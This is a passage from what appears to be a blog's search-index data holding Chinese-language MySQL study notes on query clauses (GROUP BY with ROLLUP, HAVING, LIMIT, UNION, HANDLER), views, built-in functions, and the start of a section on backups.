style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">^</td>\n<td style=\"text-align:center\">匹配字符串的开始部分</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">$</td>\n<td style=\"text-align:center\">匹配字符串结束部分</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">.</td>\n<td style=\"text-align:center\">匹配任何一个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">*</td>\n<td style=\"text-align:center\">匹配*之前的0个或多个字符的任何序列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">+</td>\n<td style=\"text-align:center\">匹配+之前的1个或多个字符的任何序列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">?</td>\n<td style=\"text-align:center\">匹配？之前的0个或多个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">{n}</td>\n<td style=\"text-align:center\">匹配括号前的内容出现n次的序列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">()</td>\n<td style=\"text-align:center\">匹配括号里的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[abc]</td>\n<td style=\"text-align:center\">略</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[a-z]</td>\n<td style=\"text-align:center\">略</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><sup><a href=\"#fn_a-z\" id=\"reffn_a-z\">a-z</a></sup></td>\n<td style=\"text-align:center\">略</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">&#124;</td>\n<td style=\"text-align:center\">匹配符号左边或右边出现的字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[[..]]</td>\n<td style=\"text-align:center\">匹配方括号里出现的符号</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[[:&lt;:]和[[:&gt;:]]</td>\n<td style=\"text-align:center\">匹配一个单词的开始和结束</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">[[:]</td>\n<td style=\"text-align:center\">匹配方括号里出现的字符串中的任意一个字符</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>范围比较(between或者in)</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">exp [not] between exp1 and exp2   # exp1必须小于exp2，表达式也可是字符串</span><br><span class=\"line\">exp in (exps [,...n])             # 该关键字主要用于表达子查询</span><br></pre></td></tr></table></figure><br><strong>空值比较</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">exp is [not] null</span><br></pre></td></tr></table></figure><br><strong>子查询</strong><br>    指使用另一个查询的结果作为条件的一部分，即查询的嵌套</p>\n<h4 id=\"1-in子查询\"><a href=\"#1-in子查询\" class=\"headerlink\" title=\"1)in子查询\"></a>1)in子查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">exp [not] in (subquery)</span><br></pre></td></tr></table></figure>\n<p>in子查询只能返回一列数据，对于较复杂的查询可使用嵌套的子查询</p>\n<h4 id=\"2-比较子查询（使表达式的值与子查询的结果进行比较运算）\"><a href=\"#2-比较子查询（使表达式的值与子查询的结果进行比较运算）\" class=\"headerlink\" title=\"2)比较子查询（使表达式的值与子查询的结果进行比较运算）\"></a>2)比较子查询（使表达式的值与子查询的结果进行比较运算）</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">表达式 &#123;&lt;|&lt;&#x3D;|&#x3D;|&gt;|&gt;&#x3D;|!&#x3D;|&lt;&gt;&#125; &#123;all|some|any&#125; (subquery)</span><br></pre></td></tr></table></figure>\n<p>all指定表达式要与结果集的每个值都进行比较，全部满足时才返回true，否则返回false。<br>some与any同义，找到满足的值就会返回true，否则返回false。</p>\n<h4 id=\"3-exists子查询\"><a href=\"#3-exists子查询\" class=\"headerlink\" title=\"3)exists子查询\"></a>3)exists子查询</h4><p>判断查询结果集是否为空表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[not] exists (subquery)</span><br></pre></td></tr></table></figure>\n<p>以上各种子查询还可用在select的其他子句中，例如from语句，但是必须为子查询产生的一个中表定义一个别名</p>\n<h3 id=\"GROUP-BY子句\"><a href=\"#GROUP-BY子句\" class=\"headerlink\" title=\"GROUP BY子句\"></a>GROUP BY子句</h3><p>根据字段进行分组，所要查找的内容不得多于分组数<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup]</span><br></pre></td></tr></table></figure><br>rollup用于对group by子句指定的各列产生汇总行。</p>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">name</span>,username <span class=\"keyword\">from</span> student <span class=\"keyword\">where</span> job=<span class=\"string\">'信息安全'</span> <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> username;</span><br></pre></td></tr></table></figure>\n<p>上述语句执行时会报错，原因在于</p>\n<blockquote>\n<p><em>group by</em> 语句的执行过程为先执行group by子句，然后对gruop by 语句的汇总行再进行操作，本例中group by子句执行后只产生了一列(列名为username)，所以执行到查询name字段时会无法查询从而报错。<br>但是这个时候可以使用聚合函数来查询其他字段的信息，因为聚合函数可以作用于所有列，当然也可以增加group by 子句的字段</p>\n</blockquote>\n<p><strong>用例解析</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 专业,性别,count(编号) from stuinfo group by 专业,性别 with rollup;</span><br></pre></td></tr></table></figure>\n<p><strong>返回结果</strong></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">专业</th>\n<th style=\"text-align:center\">性别</th>\n<th style=\"text-align:center\">count(编号)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">信息安全</td>\n<td style=\"text-align:center\">女</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">信息安全</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">信息安全</td>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">5</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">土木工程</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">土木工程</td>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">计算机</td>\n<td style=\"text-align:center\">女</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">计算机</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">计算机</td>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">9</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">20</td>\n</tr>\n</tbody>\n</table>\n</div>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 专业,性别,count(编号) from stuinfo group by 性别,专业 with rollup;</span><br></pre></td></tr></table></figure>\n<p><strong>返回结果</strong></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">专业</th>\n<th style=\"text-align:center\">性别</th>\n<th style=\"text-align:center\">count(编号)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">信息安全</td>\n<td style=\"text-align:center\">女</td>\n<td style=\"text-align:center\">1</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">计算机</td>\n<td style=\"text-align:center\">女</td>\n<td style=\"text-align:center\">3</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">女</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">信息安全</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">4</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">土木工程</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">计算机</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">6</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">男</td>\n<td style=\"text-align:center\">16</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">NULL</td>\n<td style=\"text-align:center\">20</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>以上两个查询语句只是group by语句后面的顺序不同，该语句的组织方式是按列的排序的逆序进行汇总，例如第一例先对性别字段产生了汇总（针对专业相同的行），然后对专业名和性别名均不同的行产生了汇总行，如果列数是多列的话，也依然会这样依次汇总。</p>\n<h3 id=\"HAVING子句\"><a href=\"#HAVING子句\" class=\"headerlink\" title=\"HAVING子句\"></a>HAVING子句</h3><p>HAVING子句用于在group by子句后选择行，和WHERE子句类似，where子句用于在<em>from</em>  子句后选择行，区别是<font face=\"楷体\"> having子句可以作用于聚合函数，而where子句不可以</font>。<br><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">having 条件</span><br></pre></td></tr></table></figure>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> 专业,<span class=\"keyword\">avg</span>(年龄) <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">where</span> 年龄 &lt; <span class=\"number\">96</span> <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> 专业 <span class=\"keyword\">having</span> <span class=\"keyword\">avg</span>(年龄);</span><br></pre></td></tr></table></figure>\n<h3 id=\"ORDER-BY子句\"><a href=\"#ORDER-BY子句\" class=\"headerlink\" title=\"ORDER BY子句\"></a>ORDER BY子句</h3><p>如果不适用order by子句的话，结果集中的行的顺序将是不可预料的，使用该语句行可以对行的排序顺序方式进行指定，如果order by子句后面指定了多个条件，则会按照逆序方向依次排序。<br><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by &#123;列名|表达式|position&#125; [asc|desc], ...</span><br></pre></td></tr></table></figure></p>\n<p><font face=\"fantasy\">position</font> 表示结果集中该位置的列排序，是一个正整数。</p>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 年龄;  <span class=\"comment\"># 根据年龄来排序</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"LIMIT子句\"><a href=\"#LIMIT子句\" class=\"headerlink\" title=\"LIMIT子句\"></a>LIMIT子句</h3><p>LIMIT子句用来限制 <em>select</em>  语句返回的行数。</p>\n<p><strong>语法格式</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;</span><br></pre></td></tr></table></figure>\n<p>说明：</p>\n<blockquote>\n<p><em>offset</em> 为对于结果集首行的偏移量（首行偏移量为0），如offset=3，则会从第四行开始返回数据。</p>\n</blockquote>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">where</span> 专业=<span class=\"string\">'信息安全'</span> <span class=\"keyword\">limit</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">where</span> 专业=<span class=\"string\">'信息安全'</span> <span class=\"keyword\">limit</span> <span class=\"number\">2</span> <span class=\"keyword\">offset</span> <span class=\"number\">1</span>; <span class=\"comment\"># 这两个语句是等价的</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"UNION语句\"><a href=\"#UNION语句\" class=\"headerlink\" title=\"UNION语句\"></a>UNION语句</h3><p><code>UNION</code> 语句用来把多个 <em>select</em> 语句返回的结果组合到一个结果集中。</p>\n<p><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> ...</span><br><span class=\"line\"><span class=\"keyword\">union</span> [<span class=\"keyword\">ALL</span> | <span class=\"keyword\">DISTINCT</span>] <span class=\"keyword\">select</span> ...</span><br><span class=\"line\">[ <span class=\"keyword\">union</span> [<span class=\"keyword\">ALL</span> | <span class=\"keyword\">DISTINCT</span>] <span class=\"keyword\">select</span> ... ]</span><br></pre></td></tr></table></figure>\n<p><strong>说明</strong></p>\n<p>select语句为常规的select语句，但是必须遵守以下规则</p>\n<blockquote>\n<p>1、各个select语句对应位置的列应该具有相同的列名、类型和数目，<br>2、只有最后一个select语句可以使用 <code>into outfile</code><br>3、<code>order by</code> 和 <code>limit</code> 只能在整个语句最后指定，并对整个最终结果起作用。<br>4、使用union语句的时候，MySQL会自动剔除重复数据，所以<code>distinct</code>可以省去。</p>\n</blockquote>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">where</span> 专业=<span class=\"string\">'信息安全'</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> stuinfo <span class=\"keyword\">where</span> 专业=<span class=\"string\">'土木工程'</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">5</span> <span class=\"keyword\">limit</span> <span class=\"number\">6</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"HANDLER-语句\"><a href=\"#HANDLER-语句\" class=\"headerlink\" title=\"HANDLER 语句\"></a>HANDLER 语句</h3><p>前面使用的 <code>select</code> 语句通常用来返回行的集合，MySQL中还有另外一个可以返回行的语句： <em>handler</em> 语句。它能够一行一行的浏览表中的数据，这不是SQL标准，而是MySQL 的一个扩展，只适用于MyISAM表和InnoDB表。<br>使用该语句时要先打开一个表，然后在读这个表，使用完之后还必须关闭已经打开的表。</p>\n<p>  1、打开一个表</p>\n<p><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">handler</span> tablename <span class=\"keyword\">open</span> [ [ <span class=\"keyword\">as</span> ] 别名 ];    <span class=\"comment\"># as用于指定别名</span></span><br></pre></td></tr></table></figure>\n<p>2、 浏览表中的行</p>\n<p><strong>语法格式1</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">handler</span> tablename <span class=\"keyword\">read</span> &#123; <span class=\"keyword\">first</span> | <span class=\"keyword\">next</span> &#125; [<span class=\"keyword\">where</span> 条件] [<span class=\"keyword\">limit</span> ...];</span><br></pre></td></tr></table></figure>\n<p>注意：此处的<code>limit</code> 字段用来控制返回的结果语句的行数，默认只有一行。</p>\n<p><strong>语法格式2</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">handler</span> tablename <span class=\"keyword\">read</span> 索引名 &#123;&lt;|&gt;|=|...&#125; (值...)</span><br><span class=\"line\"> [<span class=\"keyword\">where</span> 条件] [<span class=\"keyword\">limit</span> ...];     <span class=\"comment\"># 以比较运算符为索引读取行</span></span><br><span class=\"line\"><span class=\"keyword\">handler</span> tablename <span class=\"keyword\">read</span> 索引名 &#123;<span class=\"keyword\">first</span> | <span class=\"keyword\">next</span> | prev | <span class=\"keyword\">last</span> &#125;</span><br><span class=\"line\"> [<span class=\"keyword\">where</span> 条件] [<span class=\"keyword\">limit</span> ...];     <span class=\"comment\"># 以关键字来读取行</span></span><br></pre></td></tr></table></figure>\n<p> 3、关闭打开的表</p>\n<p><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">handler</span> tablename <span class=\"keyword\">close</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"视图（view）\"><a href=\"#视图（view）\" class=\"headerlink\" title=\"视图（view）\"></a>视图（view）</h3><p>此处只对视图进行简单的介绍。<br>视图是从一个或多个表（视图）中导出（通过查询方式）的表，是一个 <em>虚表</em> ，即数据库中只存储视图的结构不存储具体数据，需要时再在表中进行查询使用。使用方便，安全性高。</p>\n<p><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span></span><br><span class=\"line\">[<span class=\"keyword\">or</span> <span class=\"keyword\">replace</span>] <span class=\"comment\"># 用replace能替代同名视图</span></span><br><span class=\"line\">[definer = &#123;<span class=\"keyword\">user</span>|<span class=\"keyword\">current_user</span>&#125;]</span><br><span class=\"line\"><span class=\"keyword\">view</span> 视图名 [(列名 ...)]</span><br><span class=\"line\"><span class=\"keyword\">AS</span> <span class=\"keyword\">select</span> 语句</span><br><span class=\"line\">[<span class=\"keyword\">with</span> [<span class=\"keyword\">cascaded</span>|<span class=\"keyword\">local</span>] <span class=\"keyword\">check</span> <span class=\"keyword\">option</span>]</span><br></pre></td></tr></table></figure>\n<p>执行查询、修改、删除等操作时与对表的操作类似。</p>\n","categories":["资料"],"tags":["SQL"]},{"title":"MySQL学习笔记(五)","url":"/2018/02/07/mysql5/","content":"<p>MySQL语言结构<br><a id=\"more\"></a></p>\n<h1 id=\"MySQL语言简介\"><a href=\"#MySQL语言简介\" class=\"headerlink\" title=\"MySQL语言简介\"></a><strong>MySQL语言简介</strong></h1><p>在MySQL数据库中，SQL语言有以下四部分组成</p>\n<p>(1)数据定义语言(Data Definition Language,DDL)，用于执行的对数据库的操作，例如 <code>create</code>、 <code>alter</code>等。<br>(2)数据操纵语言(Data Manipulation Language,DML),用于操纵数据库，比如 <code>select</code>、 <code>insert</code>等。<br>(3)数据控制语言(Data Control Language),比如授予和收回权限 <code>grant</code> 和 <code>revoke</code><br>(4)MySQL增加的语言元素，比如变量常量等。</p>\n<h1 id=\"部分常量值\"><a href=\"#部分常量值\" class=\"headerlink\" title=\"部分常量值\"></a><strong>部分常量值</strong></h1><h2 id=\"十六进制常量\"><a href=\"#十六进制常量\" class=\"headerlink\" title=\"十六进制常量\"></a><strong>十六进制常量</strong></h2><p>十六进制常量通常被当做字符串来存储，在字符串前面加一个x或者X，注意数字不能超出16进制的范围，如果在前面几加0x的话就不需要加引号了，十六进制默认作为字符串来处理，如果想作为数字处理的话，使用 <em>CAST(… AS UNSIGNED)</em> 语句，比如 <code>select 0x41,cast(0x41 as unsigned);</code>, <code>HEX()</code>函数可将字符串转换为十六进制。</p>\n<h2 id=\"位字段值\"><a href=\"#位字段值\" class=\"headerlink\" title=\"位字段值\"></a><strong>位字段值</strong></h2><p>一般使用b’value’来表示二进制值。 <code>BIN()</code>可以把位字段常量转为二进制显示， <code>OCT()</code>转为数字显示。</p>\n<h1 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a><strong>变量</strong></h1><h2 id=\"用户变量\"><a href=\"#用户变量\" class=\"headerlink\" title=\"用户变量\"></a><strong>用户变量</strong></h2><p>语法格式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set @user_variables1&#x3D;expression1[,user_variables2&#x3D;expression2...]</span><br></pre></td></tr></table></figure>\n<h2 id=\"系统变量\"><a href=\"#系统变量\" class=\"headerlink\" title=\"系统变量\"></a><strong>系统变量</strong></h2><p>分为全局变量(GLOBAL)和局部变量(LOCAL &#124; SESSION)</p>\n<h1 id=\"常用函数\"><a href=\"#常用函数\" class=\"headerlink\" title=\"常用函数\"></a><strong>常用函数</strong></h1><h2 id=\"1、数学函数-数学函数支持嵌套使用\"><a href=\"#1、数学函数-数学函数支持嵌套使用\" class=\"headerlink\" title=\"1、数学函数(数学函数支持嵌套使用)\"></a>1、数学函数(数学函数支持嵌套使用)</h2><h3 id=\"1、great-和-least-函数：-获取一组数中的最大值和最小值\"><a href=\"#1、great-和-least-函数：-获取一组数中的最大值和最小值\" class=\"headerlink\" title=\"1、great() 和 least()函数： 获取一组数中的最大值和最小值\"></a>1、<em>great()</em> 和 <em>least()函数</em>： 获取一组数中的最大值和最小值</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">great(1,2,3)<span class=\"comment\">--&gt;3     least(1,2,3)--&gt;1</span></span><br></pre></td></tr></table></figure>\n<p>注意：MySQL中函数名与括号之间不能有空格</p>\n<h3 id=\"2、-floor-和-ceiling-函数\"><a href=\"#2、-floor-和-ceiling-函数\" class=\"headerlink\" title=\"2、 floor() 和 ceiling() 函数\"></a>2、 <em>floor()</em> 和 <em>ceiling()</em> 函数</h3><blockquote>\n<p><em>floor()</em> 函数用于获得小于一个整数的最大整数值，<em>ceiling</em> 用于获得大于一个整数的最小整数值。</p>\n</blockquote>\n<h3 id=\"3、-round-和-truncate\"><a href=\"#3、-round-和-truncate\" class=\"headerlink\" title=\"3、 round() 和 truncate()\"></a>3、 <em>round()</em> 和 <em>truncate()</em></h3><blockquote>\n<p><em>round()</em> 用于获得一个数的四舍五入的整数值。</p>\n<p><em>truncate(a,b)</em> 用于把一个数字a截取为一个指定小数位数b的数字</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">truncate(1.54578,2)--&gt;1.54</span><br></pre></td></tr></table></figure>\n<h3 id=\"4、-abs-函数\"><a href=\"#4、-abs-函数\" class=\"headerlink\" title=\"4、 abs() 函数\"></a>4、 <em>abs()</em> 函数</h3><blockquote>\n<p>获取绝对值</p>\n</blockquote>\n<h3 id=\"5、-sign-函数\"><a href=\"#5、-sign-函数\" class=\"headerlink\" title=\"5、 sign() 函数\"></a>5、 <em>sign()</em> 函数</h3><blockquote>\n<p>返回数字的符号，返回的结果是正数(1)，负数(-1)、或者零(0)</p>\n</blockquote>\n<h3 id=\"6、-sqrt-函数\"><a href=\"#6、-sqrt-函数\" class=\"headerlink\" title=\"6、 sqrt() 函数\"></a>6、 <em>sqrt()</em> 函数</h3><blockquote>\n<p>返回平方根</p>\n</blockquote>\n<h3 id=\"7、-pow-函数\"><a href=\"#7、-pow-函数\" class=\"headerlink\" title=\"7、 pow() 函数\"></a>7、 <em>pow()</em> 函数</h3><blockquote>\n<p>pow(a,b)—&gt; a^b</p>\n</blockquote>\n<h3 id=\"8、-bin-、-otc-、-hex-函数\"><a href=\"#8、-bin-、-otc-、-hex-函数\" class=\"headerlink\" title=\"8、 bin() 、 otc() 、 hex() 函数\"></a>8、 <em>bin()</em> 、 <em>otc()</em> 、 <em>hex()</em> 函数</h3><blockquote>\n<p>分别返回一个数的二进制、八进制和十六进制值，作为字符串返回</p>\n</blockquote>\n<h2 id=\"2、聚合函数\"><a href=\"#2、聚合函数\" class=\"headerlink\" title=\"2、聚合函数\"></a>2、聚合函数</h2><p>比如 <em>count()</em>, <em>sum()</em> 等</p>\n<h2 id=\"3、字符串函数\"><a href=\"#3、字符串函数\" class=\"headerlink\" title=\"3、字符串函数\"></a>3、字符串函数</h2><h3 id=\"1、-ascii-char-函数\"><a href=\"#1、-ascii-char-函数\" class=\"headerlink\" title=\"1、 ascii(char) 函数\"></a>1、 <em>ascii(char)</em> 函数</h3><blockquote>\n<p>返回字符表达式最左端字符的ASCII值，返回值为整型</p>\n</blockquote>\n<h3 id=\"2、-char-函数\"><a href=\"#2、-char-函数\" class=\"headerlink\" title=\"2、 char() 函数\"></a>2、 <em>char()</em> 函数</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">char(x1,x2,x3,...)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>将x1,x2,x3的ascii码转换为字符，组成一个字符串。</p>\n</blockquote>\n<h3 id=\"3、-left-和-right-函数\"><a href=\"#3、-left-和-right-函数\" class=\"headerlink\" title=\"3、 left() 和 right 函数\"></a>3、 <em>left()</em> 和 <em>right</em> 函数</h3><p><code>left&#124;right (str,x)</code> 返回字符串str左边或右边的前x个字符</p>\n<h3 id=\"4、-trim-和-ltrim-和-rtrim-函数\"><a href=\"#4、-trim-和-ltrim-和-rtrim-函数\" class=\"headerlink\" title=\"4、 trim 和 ltrim 和 rtrim 函数\"></a>4、 <em>trim</em> 和 <em>ltrim</em> 和 <em>rtrim</em> 函数</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">trim|ltrim|rtrim(str)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><em>ltrim</em> 和 <em>rtrim</em> 分别删除字符串左边和右边的空格，<em>trim</em> 则删除左右两边的空格。</p>\n</blockquote>\n<h3 id=\"5、-rpad-和-lpad-函数\"><a href=\"#5、-rpad-和-lpad-函数\" class=\"headerlink\" title=\"5、 rpad() 和 lpad 函数\"></a>5、 <em>rpad()</em> 和 <em>lpad</em> 函数</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">rpad|lpad(str,n,pad)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>用字符串pad对字符串str左边后右边进行填充，直到str的字符数目得到n个，若str的字符个数大于n，则返回前n个字符</p>\n</blockquote>\n<h3 id=\"6、-replace-str1-str2-str3-函数\"><a href=\"#6、-replace-str1-str2-str3-函数\" class=\"headerlink\" title=\"6、 replace(str1,str2,str3) 函数\"></a>6、 <em>replace(str1,str2,str3)</em> 函数</h3><blockquote>\n<p>用字符串str3替换str1中所有出现的字符串str2。</p>\n</blockquote>\n<h3 id=\"7、-concat-s1-s2-s3-…\"><a href=\"#7、-concat-s1-s2-s3-…\" class=\"headerlink\" title=\"7、 concat(s1,s2,s3,…)\"></a>7、 <em>concat(s1,s2,s3,…)</em></h3><blockquote>\n<p>字符串连接函数</p>\n</blockquote>\n<h3 id=\"8、-substring-expr-start-length\"><a href=\"#8、-substring-expr-start-length\" class=\"headerlink\" title=\"8、 substring(expr,start,length)\"></a>8、 <em>substring(expr,start,length)</em></h3><blockquote>\n<p>返回指定长度的子串</p>\n</blockquote>\n<h3 id=\"9、-strcmp-s1-s2\"><a href=\"#9、-strcmp-s1-s2\" class=\"headerlink\" title=\"9、 strcmp(s1,s2)\"></a>9、 <em>strcmp(s1,s2)</em></h3><blockquote>\n<p>字符串比较函数</p>\n</blockquote>\n<h2 id=\"4、-类型转换函数\"><a href=\"#4、-类型转换函数\" class=\"headerlink\" title=\"4、 类型转换函数\"></a>4、 类型转换函数</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cast(expr,AS type)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>expr是要转化的值，type是转换后的数据类型，类型有<em>binary</em> , <em>char</em> , <em>date</em> , <em>date</em> , <em>time</em> , <em>datetime</em> , <em>signed</em> , <em>unsigned</em> 。</p>\n</blockquote>\n<h2 id=\"5、-控制流函数\"><a href=\"#5、-控制流函数\" class=\"headerlink\" title=\"5、 控制流函数\"></a>5、 控制流函数</h2><h3 id=\"1、-ifnull-和-nullif-函数\"><a href=\"#1、-ifnull-和-nullif-函数\" class=\"headerlink\" title=\"1、 ifnull() 和 nullif() 函数\"></a>1、 <em>ifnull()</em> 和 <em>nullif()</em> 函数</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ifnull(expr1,expr2)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>判断参数expr1是否为null，如果expr1为null，则返回expr2，否则返回expr1。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nullif(expr1,expr2)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>判断两个参数是否相等，如果相等返回null，否则返回第一个参数。</p>\n</blockquote>\n<h3 id=\"2、-if-函数\"><a href=\"#2、-if-函数\" class=\"headerlink\" title=\"2、 if() 函数\"></a>2、 <em>if()</em> 函数</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>函数会判断expr1是否为真，如果表达式为真则返回第二个参数，如果为假返回第三个参数。</p>\n</blockquote>\n","categories":["资料"],"tags":["SQL"]},{"title":"MySQL学习笔记(七)","url":"/2018/02/18/mysql7/","content":"<p>本节介绍MySQL数据库的备份和恢复。</p>\n<a id=\"more\"></a>\n<h1 id=\"常用的备份恢复方法\"><a href=\"#常用的备份恢复方法\" class=\"headerlink\" title=\"常用的备份恢复方法\"></a><strong>常用的备份恢复方法</strong></h1><p>本节介绍多种备份方法</p>\n<h2 id=\"使用SQL语句：导入导出数据\"><a href=\"#使用SQL语句：导入导出数据\" class=\"headerlink\" title=\"使用SQL语句：导入导出数据\"></a><strong>使用SQL语句：导入导出数据</strong></h2><h3 id=\"1、导出表数据\"><a href=\"#1、导出表数据\" class=\"headerlink\" title=\"1、导出表数据\"></a><strong>1、导出表数据</strong></h3><p>SELECT INTO…OUTFILE格式：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">INTO</span> <span class=\"keyword\">OUTFILE</span> <span class=\"string\">'文件名1'</span></span><br><span class=\"line\">[<span class=\"keyword\">FIELDS</span></span><br><span class=\"line\">\t[<span class=\"keyword\">TERMINATED</span>(终止) <span 